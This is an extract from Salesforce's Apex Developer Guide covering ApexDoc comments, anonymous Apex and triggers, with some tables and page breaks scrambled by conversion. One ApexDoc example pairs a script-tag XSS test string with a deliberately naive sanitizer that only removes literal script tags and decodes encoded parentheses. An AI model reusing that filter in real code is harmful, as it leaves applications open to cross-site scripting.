Method Example (with params, return, throws)

```
   /**

    * Calculates the total price for a list of products, applying a discount.

    * @param productCodes A List of unique product codes to calculate the price for.

    * Each code must correspond to an existing Product2 record.

    * @param discountPercentage The discount percentage to apply (e.g., 10.5 for 10.5%).

    * Must be between 0.0 and 100.0.

    * @return The calculated total price as a Decimal after applying the discount.

    * Returns 0.0 if productCodes is null or empty.

    * @throws InvalidArgumentException if discountPercentage is out of range.

    * @throws ProductNotFoundException if any productCode does not match an

    * existing product.

    */

   public Decimal calculateTotalPrice(

     List<String> productCodes,

     Decimal discountPercentage

   ) {

      if (discountPercentage < 0.0 || discountPercentage > 100.0) {

        throw new IllegalArgumentException(

         'Discount percentage must be between 0.0 and 100.0.'

        );

      }

      if (productCodes == null || productCodes.isEmpty()) {

        return 0.0;

      }

      //... implementation logic to fetch prices and calculate total...

      return 100.0;

   }

   /**

```


Apex Developer Guide Document Your Apex Code

```
    * Represents an exception thrown when a requested product cannot be found.

    * This custom exception provides a clear indication that a product lookup failed,

    * allowing calling code to handle the 'not found' scenario specifically.

    * It is typically thrown by methods attempting to retrieve Product2 records.

    * @example

    * {@code

    * List<Product2> products = [

    * SELECT Id

    * FROM Product2

    * WHERE ProductCode = :productCode

    * LIMIT 1

    * ];

    * if (products.isEmpty()) {

    * throw new ProductNotFoundException(

    * 'Product with code ' + productCode + ' not found.'

    * );

    * }

    * }

    */

   public class ProductNotFoundException extends Exception {}

```

Annotated Method (@AuraEnabled) Example

```
   public class OpportunityService {

      /**

      * Retrieves a list of open opportunities for a given account,

      * accessible from Lightning Web Components. If the set of open opportunities

      * can change during interaction with the component, the author will

      * need to use {@code refreshApex()}.

      * @param accountId The ID of the Account to retrieve opportunities for.

      * @return A List of open Opportunity records. Returns an empty list if no

      * open opportunities are found or if accountId is invalid.

      * @see OpportunitySelector

      */

      @AuraEnabled(cacheable=true)

      public static List<Opportunity> getOpenOpportunities(Id accountId) {

        List<Opportunity> result = new List<Opportunity>();

        //... implementation details...

        return result;

      }

   }

```

External Reference Example

```
   /**

    * Provides a service to retrieve current weather conditions from an external API.

    * It utilizes Salesforce Named Credentials for secure endpoint and

    * authentication management.

    * @author John Doe

    * @since 1.0.3

    */

   public with sharing class WeatherService {

     /**

```


Apex Developer Guide Document Your Apex Code

```
     * Retrieves the current weather conditions for a specified city and country.

     * This method makes an HTTP GET callout to an external weather API using a

     * Named Credential.

     * @param city The name of the city (e.g., "London").

     * @param country The name or code of the country (e.g., "UK" or "United Kingdom").

     * @return A JSON string representing the current weather conditions.

     * @throws WeatherServiceException If the HTTP callout fails, returns a non-200 status,

     * or if there's an issue parsing the response.

     * @see <a href="https://example.com/weather-api-docs/current-conditions.html">External

     * Weather API</a>

     */

     public static String getCurrentWeather(

      String city,

      String country

     ) {

      if (String.isBlank(city) || String.isBlank(country)) {

       throw new WeatherServiceException(

        'City and country cannot be blank for weather lookup.'

       );

      }

      String namedCredentialUrl = 'callout:WeatherAPI/current';

      String requestParams =

       '?city=' +

       EncodingUtil.urlEncode(city, 'UTF-8') +

       '&country=' +

       EncodingUtil.urlEncode(country, 'UTF-8');

      HttpRequest req = new HttpRequest();

      req.setEndpoint(namedCredentialUrl + requestParams);

      req.setMethod('GET');

      req.setTimeout(60000);

      Http http = new Http();

      HttpResponse res;

      try {

       res = http.send(req);

      } catch (System.CalloutException e) {

       throw new WeatherServiceException(

        'HTTP Callout Failed: ' + e.getMessage()

       );

      }

      if (res.getStatusCode() == 200) {

       return res.getBody();

      } else {

       throw new WeatherServiceException(

        'Failed to retrieve weather data. Status: ' +

         res.getStatusCode() +

         '. Details: ' +

         res.getBody()

```


## Apex Developer Guide Running Apex

```
       );

      }

     }

     /**

     * Custom exception for errors during weather data retrieval.

     */

     public class WeatherServiceException extends Exception {

     }

   }

```

Inline Tags Example

```
   /**

    * Sanitizes a given input string by removing or replacing certain

    * characters such as {@code <script>}

    * @param inputString The raw string provided by a user or external source.

    * This string might contain malicious or unexpected characters,

    * like a {@literal <script>} tag or a backslash {@literal \}.

    * @return The sanitized string after processing.

    * @example

    * {@code

    * String badInput = 'Hello, <script>alert(\'xss\')</script> World!';

    * String safeOutput = SecurityUtils.sanitizeInput(badInput);

    * System.debug('Sanitized Output: ' + safeOutput);

    * } * @see {@link String#escapeHtml4} for a similar built-in method.

    * {@hidden NOTE TO MAINTAINERS: This method should be updated if

    * new security threats are identified. The current regex

    * is designed to handle common XSS patterns but may not

    * be exhaustive. The last major update was in v2.1.}

    * @since 2.0

    */

   global static String sanitizeInput(String inputString) {

     // simple example for demonstration purposes

     String sanitized = inputString;

     sanitized = sanitized.replace('<script>', '').replace('</script>', '');

     sanitized = sanitized.replace('&#40;','(').replace('&#41;',')');

     return sanitized;

   }

```

SEE ALSO:

ApexDoc Comment Structure and Tags

Document Apex Constructs and Features

## Running Apex

You can access many features of the Salesforce user interface programmatically in Apex, and you can integrate with external SOAP and
REST Web services. You can run Apex code using a variety of mechanisms. Apex code runs in atomic transactions.


### Apex Developer Guide Invoking Apex Invoking Apex

You can run Apex code with triggers, or asynchronously, or as SOAP or REST web services.

Apex Transactions and Governor Limits
Apex Transactions ensure the integrity of data. Apex code runs as part of atomic transactions. Governor execution limits ensure the
efficient use of resources on the Lightning Platform multitenant platform.

Using Salesforce Features with Apex
Many features of the Salesforce user interface are exposed in Apex so that you can access them programmatically in the Lightning
Platform. For example, you can write Apex code to post to a Chatter feed, or use the approval methods to submit and approve
process requests.

Integration and Apex Utilities
Apex allows you to integrate with external SOAP and REST Web services using callouts. You can use utilities for JSON, XML, data
security, and encoding. A general-purpose utility for regular expressions with text strings is also provided.

### Invoking Apex

You can run Apex code with triggers, or asynchronously, or as SOAP or REST web services.

1. Anonymous Blocks
An anonymous block is Apex code that doesn’t get stored in the metadata, but that you can compile and execute.

2. Triggers
Apex can be invoked by using _triggers_ . Apex triggers enable you to perform custom actions before or after changes to Salesforce
records, such as insertions, updates, or deletions.

3. Asynchronous Apex
Apex offers multiple ways for running your Apex code asynchronously. Choose the asynchronous Apex feature that best suits your
needs.

4. Exposing Apex Methods as SOAP Web Services
You can expose your Apex methods as SOAP web services so that external applications can access your code and your application.

5. Exposing Apex Classes as REST Web Services
You can expose your Apex classes and methods so that external applications can access your code and your application through
the REST architecture.

6. Apex Email Service
You can use email services to process the contents, headers, and attachments of inbound email. For example, you can create an
email service that automatically creates contact records based on contact information in messages.

7. Using the InboundEmail Object
For every email the Apex email service domain receives, Salesforce creates a separate InboundEmail object that contains the contents
and attachments of that email. You can use Apex classes that implement the `Messaging.InboundEmailHandler` interface
to handle an inbound email message. Using the `handleInboundEmail` method in that class, you can access an InboundEmail
object to retrieve the contents, headers, and attachments of inbound email messages, as well as perform many functions.

8. Visualforce Classes
In addition to giving developers the ability to add business logic to Salesforce system events such as button clicks and related record
updates, Apex can also be used to provide custom logic for Visualforce pages through custom Visualforce controllers and controller
extensions.


Apex Developer Guide Invoking Apex

9. JavaScript Remoting
Use JavaScript remoting in Visualforce to call methods in Apex controllers from JavaScript. Create pages with complex, dynamic
behavior that isn’t possible with the standard Visualforce AJAX components.

10. Apex in AJAX

The AJAX toolkit includes built-in support for invoking Apex through anonymous blocks or public `webservice` methods.

#### Anonymous Blocks

An anonymous block is Apex code that doesn’t get stored in the metadata, but that you can compile and execute.

User permissions needed to execute anonymous Apex: “API Enabled” and “Author Apex”

(Anonymous Apex execution through the API allows restricted
access without the “Author Apex” permission.)

User permissions needed if an anonymous Apex callout references Customize Application
a named credential as the endpoint:

Compile and execute anonymous blocks by using one of these Salesforce development tools.

**•** [Web Console (Beta)](https://developer.salesforce.com/docs/platform/webconsole/overview)

**•** [Salesforce Extensions for Visual Studio Code](https://developer.salesforce.com/docs/platform/sfvscode-extensions/overview)

**•** [Agentforce Vibes IDE](https://developer.salesforce.com/docs/platform/code-builder/overview)

**•** Developer Console

You can also execute anonymous blocks by using the `[executeAnonymous()](https://developer.salesforce.com/docs/atlas.en-us.262.0.api.meta/api/sforce_api_calls_executeanonymous.htm)` SOAP API call.

```
   ExecuteAnonymousResult executeAnonymous(String code)

```

Important: Every time you run an anonymous block, the code and its references are compiled. For repetitive calls, we strongly
recommend that you use compiled classes, such as Apex REST endpoints.

Note the following about the content of an anonymous block.

**•** The anonymous block can include user-defined methods and exceptions.

**•** User-defined methods can’t include the keyword `static` .

**•** You don’t have to commit any database changes manually .

**•** If an Apex trigger within an anonymous block completes successfully, the changes are committed to the database only after all
operations in the block finish executing successfully. If your Apex trigger doesn’t complete successfully, any changes made to the
database in the anonymous block are rolled back.

**•** Anonymous blocks run as the current user and can fail to compile if the code violates the user’s object- and field-level permissions.

**•** The content in the anonymous block has a local scope. For example, although it’s legal to use the `global` access modifier, it has
no meaning. The scope of the method is limited to the anonymous block.

**•** When you define a class or interface (a custom type) in an anonymous block, it’s considered virtual by default when the anonymous
block executes. This fact is true even if your custom type isn’t defined with the `virtual` modifier.

**•** Classes and interfaces defined in an anonymous block aren’t saved to your org.


Apex Developer Guide Invoking Apex

Even though a user-defined method can refer to itself or later methods without the need for forward declarations, variables can’t be
referenced before their actual declaration. In this example, the Integer `int` must be declared while `myProcedure1` doesn’t:

```
   Integer int1 = 0;

   void myProcedure1() {

      myProcedure2();

   }

   void myProcedure2() {

      int1++;

   }

   myProcedure1();

```

The returned result for anonymous blocks includes:

**•** Status information for the compile and execute phases of the call, including any errors that occur

**•** The debug log content, including the output of any calls to the `System.debug` method (see Debug Log on page 679)

**•** The Apex stack trace of any uncaught code execution exceptions, including the class, method, and line number for each call stack
element

Important: Salesforce blocks anonymous Apex code invoked from both first-generation (1GP) and second-generation (2GP)
managed packages. Managed packages can’t use `[UserInfo.getSessionId()](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_methods_system_userinfo.htm#apex_System_UserInfo_getSessionId)` to obtain a session ID and then use the
session ID to execute anonymous Apex. This update is available to package subscribers starting in Summer ’26 and is enforced in
[Summer ’27. See Block Execute Anonymous from Managed Packages (Release Update).](https://help.salesforce.com/s/articleView?id=release-notes.rn_apex_block_exec_anon_ru.htm&type=5&language=en_US)

Executing Anonymous Apex Through the API and the Author Apex Permission

To run any Apex code with the `executeAnonymous()` API call, including Apex methods saved in the org, users must have the
Author Apex permission. For users who don’t have the Author Apex permission, the API allows restricted execution of anonymous Apex.
This exception applies only when users execute anonymous Apex through the API or through a developer tool that uses the API. Such
users are allowed to run the following in an anonymous block.

**•** Code that they write in the anonymous block

**•** Web service methods (methods declared with the `webservice` keyword) that are saved in the org

**•** Any built-in Apex methods that are part of the Apex language

Running any other Apex code is blocked if the user doesn’t have the Author Apex permission. For example, calling methods of custom
Apex classes that are saved in the org isn’t allowed nor is using custom classes as arguments to built-in methods.

When users without the Author Apex permission run DML statements in an anonymous block, triggers can get fired as a result.

SEE ALSO:

Named Credentials as Callout Endpoints

#### Triggers

Apex can be invoked by using _triggers_ . Apex triggers enable you to perform custom actions before or after changes to Salesforce records,
such as insertions, updates, or deletions.

A trigger is Apex code that executes:

**•** Before or after an insert operation


Apex Developer Guide Invoking Apex

**•** Before or after an update operation

**•** Before or after a delete operation

**•** Before or after a merge operation

**•** Before or after an upsert operation

**•** After an undelete operation

An Apex trigger can also execute after the undelete operation.

For example, you can have a trigger run before an object's records are inserted into the database, after records have been deleted, or
even after a record is restored from the Recycle Bin.

You can define triggers for top-level standard objects that support triggers, such as a Contact or an Account, some standard child objects,
such as a CaseComment, and custom objects. To define a trigger, from the object management settings for the object whose triggers
you want to access, go to Triggers.

There are two types of triggers.

**•** _Before triggers_ are used to update or validate record values before they’re saved to the database.

**•** _After triggers_ are used to access field values that are set by the system (such as a record's `Id` or `LastModifiedDate` field), and
to affect changes in other records, such as logging into an audit table or firing asynchronous events with a queue. The records that
fire the _after trigger_ are read-only.

Triggers can also modify other records of the same type as the records that initially fired the trigger. For example, if a trigger fires after
an update of contact _`A`_, the trigger can also modify contacts _`B`_, _`C`_, and _`D`_ . Because triggers can cause other records to change, and
because these changes can, in turn, fire more triggers, the Apex runtime engine considers all such operations a single unit of work and
sets limits on the number of operations that can be performed to prevent infinite recursion. See Execution Governors and Limits on page
349.

Additionally, if you update or delete a record in its before trigger, or delete a record in its after trigger, you will receive a runtime error.
This includes both direct and indirect operations. For example, if you update account _`A`_, and the before update trigger of account _`A`_
inserts contact _`B`_, and the after insert trigger of contact _`B`_ queries for account _`A`_ and updates it using the DML `update` statement or
database method, then you are indirectly updating account _`A`_ in its before trigger, and you will receive a runtime error.

Implementation Considerations

Before creating triggers, consider the following:

**•** `upsert` triggers fire both before and after `insert` or before and after `update` triggers as appropriate.

**•** `merge` triggers fire both before and after `delete` for the losing records, and both before and after `update` triggers for the
winning record. See Triggers and Merge Statements on page 276.

**•** Triggers that execute after a record has been undeleted only work with specific objects. See Triggers and Recovered Records on
page 276.

**•** Field history is not recorded until the end of a trigger. If you query field history in a trigger, you don’t see any history for the current
transaction.

**•** Field history tracking honors the permissions of the current user. If the current user doesn’t have permission to directly edit an object
or field, but the user activates a trigger that changes an object or field with history tracking enabled, no history of the change is
recorded.

**•** Callouts must be made asynchronously from a trigger so that the trigger process isn’t blocked while waiting for the external service's
response. The asynchronous callout is made in a background process, and the response is received when the external service returns
it. To make an asynchronous callout, use asynchronous Apex such as a future method. See Invoking Callouts Using Apex for more
information.


Apex Developer Guide Invoking Apex

**•** In API version 20.0 and earlier, if a Bulk API request causes a trigger to fire, each chunk of 200 records for the trigger to process is split
into chunks of 100 records. In Salesforce API version 21.0 and later, no further splits of API chunks occur. If a Bulk API request causes
a trigger to fire multiple times for chunks of 200 records, governor limits are reset between these trigger invocations for the same
HTTP request.

##### 1. Bulk Triggers

2. Trigger Syntax

3. Trigger Context Variables
All triggers define implicit variables that allow developers to access run-time context. These variables are contained in the
`System.Trigger` class.

4. Context Variable Considerations

5. Common Bulk Trigger Idioms

6. Defining Triggers
Trigger code is stored as metadata under the object with which they are associated.

7. Triggers and Merge Statements

8. Triggers and Recovered Records

9. Triggers and Order of Execution
When you save a record with an `insert`, `update`, or `upsert` statement, Salesforce performs a sequence of events in a certain
order.

10. Operations That Don't Invoke Triggers

Some operations don’t invoke triggers.

11. Entity and Field Considerations in Triggers

When you create triggers, consider the behavior of certain entities, fields, and operations.

12. Triggers for Chatter Objects

You can write triggers for the FeedItem and FeedComment objects.

13. Trigger Considerations for Knowledge Articles

You can write triggers for KnowledgeArticleVersion objects. Learn when you can use triggers, and which actions don’t fire triggers,
like archiving articles.

14. Trigger Exceptions

15. Trigger and Bulk Request Best Practices

##### Bulk Triggers

All triggers are _bulk triggers_ by default, and can process multiple records at a time. You should always plan on processing more than one
record at a time.

Note: An Event object that is defined as recurring is not processed in bulk for `insert`, `delete`, or `update` triggers.

Bulk triggers can handle both single record updates and bulk operations like:

**•** Data import

**•** Lightning Platform Bulk API calls

**•** Mass actions, such as record owner changes and deletes

**•** Recursive Apex methods and triggers that invoke bulk DML statements


Apex Developer Guide Invoking Apex

##### Trigger Syntax

To define a trigger, use the following syntax:

```
   trigger TriggerName on ObjectName ( trigger_events ) {

               code_block

                }

```

where _`trigger_events`_ can be a comma-separated list of one or more of the following events:

For example, the following code defines a trigger for the `before insert` and `before update` events on the Account object:

```
   trigger myAccountTrigger on Account (before insert, before update) {

      // Your code here

   }

```

The code block of a trigger cannot contain the `static` keyword. Triggers can only contain keywords applicable to an inner class. In
addition, you do not have to manually commit any database changes made by a trigger. If your Apex trigger completes successfully,
any database changes are automatically committed. If your Apex trigger does not complete successfully, any changes made to the
database are rolled back.

##### Trigger Context Variables

All triggers define implicit variables that allow developers to access run-time context. These variables are contained in the
`System.Trigger` class.

Here are the trigger context variables.

**Variable** **Usage**

`isExecuting` Returns `true` if the current context for the Apex code is a trigger, not a Visualforce page, a web
service, or an `executeanonymous()` API call.

`isInsert` Returns `true` if this trigger was fired due to an insert operation, from the Salesforce user interface,
Apex, or the API.

`isUpdate` Returns `true` if this trigger was fired due to an update operation, from the Salesforce user interface,
Apex, or the API.

`isDelete` Returns `true` if this trigger was fired due to a delete operation, from the Salesforce user interface,
Apex, or the API.

`isBefore` Returns `true` if this trigger was fired before any record was saved.

`isAfter` Returns `true` if this trigger was fired after all records were saved.

`isUndelete` Returns `true` if this trigger was fired after a record is recovered from the Recycle Bin. This recovery
can occur after an undelete operation from the Salesforce user interface, Apex, or the API.

```
new

newMap

```

Returns a list of the new versions of the sObject records.

This sObject list is only available in `insert`, `update`, and `undelete` triggers, and the records
can only be modified in `before` triggers.

A map of IDs to the new versions of the sObject records.

This map is only available in `before update`, `after insert`, `after update`, and
`after undelete` triggers.


Apex Developer Guide Invoking Apex

**Variable** **Usage**

```
old

oldMap

operationType

```

Returns a list of the old versions of the sObject records.

This sObject list is only available in `update` and `delete` triggers.

A map of IDs to the old versions of the sObject records.

This map is only available in `update` and `delete` triggers.

Returns an enum of type `System.TriggerOperation` corresponding to the current operation.

Possible values of the System.TriggerOperation enum are: `BEFORE_INSERT`, `BEFORE_UPDATE`,
`BEFORE_DELETE`, `AFTER_INSERT`, `AFTER_UPDATE`, `AFTER_DELETE`, and

`AFTER_UNDELETE` . If you vary your programming logic based on different trigger types, consider
using the `switch` statement with different permutations of unique trigger execution enum states.

`size` The number of records processed in a trigger invocation. DML operations that include over 200
records are processed in batches, and the trigger is invoked for each batch. `Trigger.size`

includes only the number of records in the current batch, not the total number of records in the DML
operation.

Note: The record firing a trigger can include an invalid field value, such as a formula that divides by zero. In this case, the field
value is set to `null` in these variables:

**•** `new`

**•** `newMap`

**•** `old`

**•** `oldMap`

For example, in this simple trigger, `Trigger.new` is a list of sObjects and can be iterated over in a `for` loop. It can also be used as
a bind variable in the `IN` clause of a SOQL query.

```
trigger SimpleTrigger on Account(after insert) {

  for (Account a : Trigger.new) {

   // Iterate over each sObject

  }

  // This single query finds every contact that is associated with any of the

  // triggering accounts. Note that although Trigger.new is a collection of

  // records, when used as a bind variable in a SOQL query, Apex automatically

  // transforms the list of records into a list of corresponding Ids.

  Contact[] cons = [

   SELECT LastName

   FROM Contact

   WHERE AccountId IN :Trigger.new

   WITH USER_MODE

  ];

}

```


Apex Developer Guide Invoking Apex

This trigger uses Boolean context variables such as `Trigger.isBefore` and `Trigger.isDelete` to define code that only
executes for specific trigger conditions:

```
   trigger MyAccountTrigger on Account(

     before delete,

     before insert,

     before update,

     after delete,

     after insert,

     after update

   ) {

     if (Trigger.isBefore) {

      if (Trigger.isDelete) {

       // In a before delete trigger, the trigger accesses the records that will be

       // deleted with the Trigger.old list.

       for (Account a : Trigger.old) {

        if (a.name != 'okToDelete') {

         a.addError('You can\'t delete this record!');

        }

       }

      } else {

       // In before insert or before update triggers, the trigger accesses the new records

       // with the Trigger.new list.

       for (Account a : Trigger.new) {

        if (a.name == 'bad') {

         a.name.addError('Bad name');

        }

       }

       if (Trigger.isInsert) {

        for (Account a : Trigger.new) {

         Assert.areEqual('xxx', a.accountNumber);

         Assert.areEqual('industry', a.industry);

         Assert.areEqual(100, a.numberofemployees);

         Assert.areEqual(100.0, a.annualrevenue);

         a.accountNumber = 'yyy';

        }

        // If the trigger is not a before trigger, it must be an after trigger.

       } else {

        if (Trigger.isInsert) {

         List<Contact> contacts = new List<Contact>();

         for (Account a : Trigger.new) {

           if (a.Name == 'makeContact') {

            contacts.add(new Contact(LastName = a.Name, AccountId = a.Id));

           }

         }

         insert as user contacts;

        }

       }

      }

```


Apex Developer Guide Invoking Apex

```
     }

   }

```

SEE ALSO:

_Apex Reference Guide_ [: TriggerOperation Enum](https://developer.salesforce.com/docs/atlas.en-us.262.0.apexref.meta/apexref/apex_enum_System_TriggerOperation.htm)

Switch Statements

##### Context Variable Considerations

Be aware of the following considerations for trigger context variables:

**•** `trigger.new` and `trigger.old` cannot be used in Apex DML operations.

**•** You can use an object to change its own field values using `trigger.new`, but only in before triggers. In all after triggers,

`trigger.new` is not saved, so a runtime exception is thrown.

**•** `trigger.old` is always read-only.

**•** You cannot delete `trigger.new` .

The following table lists considerations about certain actions in different trigger events:

**Trigger Event** **Can change fields using**

```
             trigger.new

```

**Can update original object**
**using an update DML**
**operation**

**Can delete original object**
**using a delete DML**
**operation**

`before insert` Allowed. Not applicable. The original Not applicable. The original
object has not been created; object has not been created;

nothing can reference it, so nothing can reference it, so
nothing can update it. nothing can update it.

Allowed, but unnecessary. The
object is deleted immediately
after being inserted.

```
after insert

```

Not allowed. A runtime error is Allowed.
thrown, as `trigger.new` is
already saved.

`before update` Allowed. Not allowed. A runtime error is Not allowed. A runtime error is
thrown. thrown.

```
after update

before delete

after delete

```

Not allowed. A runtime error is Allowed. Even though bad code Allowed. The updates are saved
thrown, as `trigger.new` is could cause an infinite recursion before the object is deleted, so
already saved. doing this incorrectly, the error if the object is undeleted, the

would be found by the governor updates become visible.
limits.

Not allowed. A runtime error is Not applicable. The object has Not applicable. The object has
thrown. `trigger.new` is not already been deleted. already been deleted.
available in after delete triggers.


Not allowed. A runtime error is
thrown. `trigger.new` is not
available in before delete
triggers.

Allowed. The updates are saved
before the object is deleted, so
if the object is undeleted, the
updates become visible.

Not allowed. A runtime error is
thrown. The deletion is already
in progress.

Apex Developer Guide Invoking Apex

**Trigger Event** **Can change fields using**

```
             trigger.new

```

**Can update original object**
**using an update DML**
**operation**

**Can delete original object**
**using a delete DML**
**operation**

Allowed, but unnecessary. The
object is deleted immediately
after being inserted.

`after undelete` Not allowed. A runtime error is Allowed.
thrown.

##### Common Bulk Trigger Idioms

Although bulk triggers allow developers to process more records without exceeding execution governor limits, they can be more difficult
for developers to understand and code because they involve processing batches of several records at a time. The following sections
provide examples of idioms that should be used frequently when writing in bulk.

Using Maps and Sets in Bulk Triggers

Set and map data structures are critical for successful coding of bulk triggers. Sets can be used to isolate distinct records, while maps
can be used to hold query results organized by record ID.

For example, this bulk trigger from the sample quoting application first adds each pricebook entry associated with the OpportunityLineItem
records in `Trigger.new` to a set, ensuring that the set contains only distinct elements. It then queries the PricebookEntries for their
associated product color, and places the results in a map. Once the map is created, the trigger iterates through the OpportunityLineItems
in `Trigger.new` and uses the map to assign the appropriate color.

```
// When a new line item is added to an opportunity, this trigger copies the value of the

// associated product's color to the new record.

trigger oppLineTrigger on OpportunityLineItem (before insert) {

   // For every OpportunityLineItem record, add its associated pricebook entry

   // to a set so there are no duplicates.

   Set<Id> pbeIds = new Set<Id>();

   for (OpportunityLineItem oli : Trigger.new)

     pbeIds.add(oli.pricebookentryid);

   // Query the PricebookEntries for their associated product color and place the results

   // in a map.

   Map<Id, PricebookEntry> entries = new Map<Id, PricebookEntry>(

     [select product2.color__c from pricebookentry

      where id in :pbeIds]);

   // Now use the map to set the appropriate color on every OpportunityLineItem processed

   // by the trigger.

   for (OpportunityLineItem oli : Trigger.new)

     oli.color__c = entries.get(oli.pricebookEntryId).product2.color__c;

}

```

Correlating Records with Query Results in Bulk Triggers

Use the `Trigger.newMap` and `Trigger.oldMap` ID-to-sObject maps to correlate records with query results. For example, this
trigger from the sample quoting app uses `Trigger.oldMap` to create a set of unique IDs ( `Trigger.oldMap.keySet()` ).


Apex Developer Guide Invoking Apex

The set is then used as part of a query to create a list of quotes associated with the opportunities being processed by the trigger. For
every quote returned by the query, the related opportunity is retrieved from `Trigger.oldMap` and prevented from being deleted:

```
   trigger oppTrigger on Opportunity (before delete) {

      for (Quote__c q : [SELECT opportunity__c FROM quote__c

                 WHERE opportunity__c IN :Trigger.oldMap.keySet()]) {

        Trigger.oldMap.get(q.opportunity__c).addError('Cannot delete

                                    opportunity with a quote');

      }

   }

```

Using Triggers to Insert or Update Records with Unique Fields

When an `insert` or `upsert` event causes a record to duplicate the value of a unique field in another new record in that batch, the
error message for the duplicate record includes the ID of the first record. However, it is possible that the error message may not be correct
by the time the request is finished.

When there are triggers present, the retry logic in bulk operations causes a rollback/retry cycle to occur. That retry cycle assigns new
keys to the new records. For example, if two records are inserted with the same value for a unique field, and you also have an `insert`
event defined for a trigger, the second duplicate record fails, reporting the ID of the first record. However, once the system rolls back the
changes and re-inserts the first record by itself, the record receives a new ID. That means the error message reported by the second
record is no longer valid.

##### Defining Triggers

Trigger code is stored as metadata under the object with which they are associated.

To define a trigger in Salesforce:

**1.** From the object management settings for the object whose triggers you want to access, go to Triggers.

Tip: For the Attachment, ContentDocument, and Note standard objects, you can’t create a trigger in the Salesforce user
interface. For these objects, create a trigger using development tools, such as the Developer Console or the Salesforce extensions
for Visual Studio Code. Alternatively, you can also use the Metadata API.

**2.** In the Triggers list, click **New** .

**3.** To specify the version of Apex and the API used with this trigger, click Version Settings. If your organization has installed managed
packages from the AppExchange, you can also specify which version of each managed package to use with this trigger. Associate
the trigger with the most recent version of Apex and the API and each managed package by using the default values for all versions.
You can specify an older version of a managed package if you want to access components or functionality that differs from the most
recent package version.

**4.** Click Apex Trigger and select the `Is Active` checkbox if you want to compile and enable the trigger. Leave this checkbox
deselected if you only want to store the code in your organization's metadata. This checkbox is selected by default.

**5.** In the `Body` text box, enter the Apex for the trigger. A single trigger can be up to 1 million characters in length.

To define a trigger, use the following syntax:

```
     trigger TriggerName on ObjectName ( trigger_events ) {

                 code_block

                  }

```

where _`trigger_events`_ can be a comma-separated list of one or more of the following events:

**•** `before insert`


Apex Developer Guide Invoking Apex

**•** `before update`

**•** `before delete`

**•** `after insert`

**•** `after update`

**•** `after delete`

**•** `after undelete`

Note:

**•** A trigger invoked by an `insert`, `delete`, or `update` of a recurring event or recurring task results in a runtime error
when the trigger is called in bulk from the Lightning Platform API.

**•** Suppose that you use an after-insert or after-update trigger to change ownership of leads, contacts, or opportunities. If
you use the API to change record ownership, or if a Lightning Experience user changes a record’s owner, no email notification
is sent. To send email notifications to a record’s new owner, set the `triggerUserEmail` property in DMLOptions to

`true` .

**6.** Click **Save** .

Note: Triggers are stored with an `isValid` flag that is set to `true` as long as dependent metadata has not changed since
the trigger was last compiled. If any changes are made to object names or fields that are used in the trigger, including superficial
changes such as edits to an object or field description, the `isValid` flag is set to `false` until the Apex compiler reprocesses
the code. Recompiling occurs when the trigger is next executed, or when a user resaves the trigger in metadata.

If a lookup field references a record that has been deleted, Salesforce clears the value of the lookup field by default. Alternatively,
you can choose to prevent records from being deleted if they’re in a lookup relationship.

The Apex Trigger Editor

The Apex and Visualforce editor has the following functionality:

**Syntax highlighting**
The editor automatically applies syntax highlighting for keywords and all functions and operators.

**Search (** **)**
Search enables you to search for text within the current page, class, or trigger. To use search, enter a string in the `Search` textbox
and click **Find Next** .

**•** To replace a found search string with another string, enter the new string in the `Replace` textbox and click **replace** to replace
just that instance, or **Replace All** to replace that instance and all other instances of the search string that occur in the page, class,
or trigger.

**•** To make the search operation case sensitive, select the **Match Case** option.

**•** To use a regular expression as your search string, select the **Regular Expressions** option. The regular expressions follow
JavaScript's regular expression rules. A search using regular expressions can find strings that wrap over more than one line.

If you use the replace operation with a string found by a regular expression, the replace operation can also bind regular expression
group variables ( `$1`, `$2`, and so on) from the found search string. For example, to replace an `<h1>` tag with an `<h2>` tag and
keep all the attributes on the original `<h1>` intact, search for `<h1(\s+)(.*)>` and replace it with `<h2$1$2>` .

**Go to line (** **)**
This button allows you to highlight a specified line number. If the line is not currently visible, the editor scrolls to that line.


Apex Developer Guide Invoking Apex

**Undo (** **) and Redo (** **)**
Use undo to reverse an editing action and redo to recreate an editing action that was undone.

**Font size**
Select a font size from the drop-down list to control the size of the characters displayed in the editor.

**Line and column position**
The line and column position of the cursor is displayed in the status bar at the bottom of the editor. This can be used with go to line

( ) to quickly navigate through the editor.

**Line and character count**
The total number of lines and characters is displayed in the status bar at the bottom of the editor.

##### Triggers and Merge Statements

Merge events do not fire their own trigger events. Instead, they fire delete and update events as follows:

**Deletion of losing records**
A single merge operation fires a single delete event for all records that are deleted in the merge. To determine which records were
deleted as a result of a merge operation use the `MasterRecordId` field in `Trigger.old` . When a record is deleted after
losing a merge operation, its `MasterRecordId` field is set to the ID of the winning record. The `MasterRecordId` field is
only set in `after delete` trigger events. If your application requires special handling for deleted records that occur as a result
of a merge, you need to use the `after delete` trigger event.

**Update of the winning record**
A single merge operation fires a single update event for the winning record only. Any child records that are reparented as a result
of the merge operation do not fire triggers.

For example, if two contacts are merged, only the delete and update contact triggers fire. No triggers for records related to the contacts,
such as accounts or opportunities, fire.

The following is the order of events when a merge occurs:

**1.** The `before delete` trigger fires.

**2.** The system deletes the necessary records due to the merge, assigns new parent records to the child records, and sets the
`MasterRecordId` field on the deleted records.

**3.** The `after delete` trigger fires.

**4.** The system does the specific updates required for the master record. Normal update triggers apply.

##### Triggers and Recovered Records

The `after undelete` trigger event only works with recovered records—that is, records that were deleted and then recovered
from the Recycle Bin through the `undelete` DML statement. These are also called undeleted records.

The `after undelete` trigger events only run on top-level objects. For example, if you delete an Account, an Opportunity may also
be deleted. When you recover the Account from the Recycle Bin, the Opportunity is also recovered. If there is an `after undelete`
trigger event associated with both the Account and the Opportunity, only the Account `after undelete` trigger event executes.

The `after undelete` trigger event only fires for custom objects and these standard objects.

**•** Account

**•** Asset

**•** Campaign

**•** Case


Apex Developer Guide Invoking Apex

**•** Contact

**•** ContentDocument

**•** Contract

**•** Event

**•** Lead

**•** Opportunity

**•** Product

**•** Solution

**•** Task

##### Triggers and Order of Execution

When you save a record with an `insert`, `update`, or `upsert` statement, Salesforce performs a sequence of events in a certain
order.

Before Salesforce executes these events on the server, the browser runs JavaScript validation if the record contains any dependent picklist
fields. The validation limits each dependent picklist field to its available values. No other validation occurs on the client side.

[Note: For a diagrammatic representation of the order of execution, see the Order of Execution Flowchart in the](http://developer.salesforce.com/docs/platform/data-models/guide/order-of-execution.html) _Salesforce Data_
_Model Gallery_ . The diagram is specific to the API version indicated on it, and can be out-of-sync with the information here. This
